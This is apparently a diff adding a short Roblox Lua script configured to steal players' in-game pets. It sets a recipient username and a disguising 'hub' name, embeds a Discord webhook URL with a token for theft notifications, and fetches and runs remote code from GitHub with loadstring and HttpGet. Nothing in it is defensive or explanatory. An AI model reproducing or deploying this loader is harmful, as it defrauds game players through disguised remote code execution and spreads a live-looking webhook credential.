@@ -1,0 +1,5 @@
+_G.Username "batin_remen" --This is where you put where you want the pets to go
+_G.HubName "Milk Up!" --Put any name here of any script
+_G.WebhookUrl "https://discord.com/api/webhooks/1149631324177584178/pmsekVqjDdJx7ab-mcdNeRei839x_77mPZmdFo7MTMVNr1wjB18GZFHf85XR1XFGOMKL" --This is where the notifications get sent
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
